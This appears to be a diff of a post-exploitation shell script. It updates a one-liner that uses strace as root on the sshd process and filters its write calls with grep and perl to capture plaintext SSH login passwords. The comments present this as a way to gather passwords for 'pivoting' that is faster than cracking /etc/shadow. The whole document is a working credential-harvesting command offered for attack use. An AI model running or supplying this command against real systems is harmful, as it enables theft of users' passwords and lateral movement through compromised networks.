@@ -2,8 +2,7 @@
 #
 # In a facepalm revelation, it has come to my attention that you can use strace as root to collect passwords from sshd
 # Passwords are useful for pivoting and can be significantly faster than cracking /etc/shadow
-# 9 characters gets padded to 10 characters. 13 characters get padded to 14.
-# I've seen padding with 'r' and 't' so far
+# I think I fixed the random char padding problem, but now perl is required
 #
 
-strace -s 64 -fp `cat /var/run/sshd.pid` 2>&1 | grep --line-buffered -Eo 'write\(4, "\\0\\0\\0\\[0-9]*[^\]{2,}[^\\0]"' | sed -e 's/write(4, "\\0\\0\\0\\[0-9]*\(.*\)"/\1/g'
+strace -s 128 -fp `cat /var/run/sshd.pid` 2>&1 | grep --line-buffered -oP 'write\(4, "\\0\\0\\0\\[\d]*[^\\]{2,}[^\\0]"' | perl -pe 's/write\(4, "\\0\\0\\0\\([\d]+|[\w])(.*)"/\2/g'
